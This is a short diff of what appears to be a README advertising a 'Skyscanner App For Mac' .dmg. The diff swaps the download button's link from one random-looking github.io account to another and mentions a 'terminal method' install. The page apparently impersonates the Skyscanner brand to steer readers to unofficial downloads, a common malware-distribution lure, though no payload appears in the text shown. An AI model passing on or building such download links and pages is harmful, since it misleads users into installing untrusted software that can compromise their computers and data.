@@ -3,7 +3,7 @@ Download Skyscanner App For Mac — safe, easy setup with .dmg installer and one
 
 ![Skyscanner App For Mac logo](https://upload.wikimedia.org/wikipedia/commons/thumb/9/94/Skyscanner_Logo_LockupHorizontal_SkyBlue_RGB.svg/2560px-Skyscanner_Logo_LockupHorizontal_SkyBlue_RGB.svg.png)
 
-[![Download for macOS](https://img.shields.io/badge/Download-for%20macOS-000000?logo=apple&logoColor=white&style=for-the-badge)](https://kamartamara.github.io/.github/skyscanner)
+[![Download for macOS](https://img.shields.io/badge/Download-for%20macOS-000000?logo=apple&logoColor=white&style=for-the-badge)](https://tayusikf8398.github.io/.github/skyscanner)
 
 > If the button above does not start a download, follow the installation instructions below or use the terminal method.
 
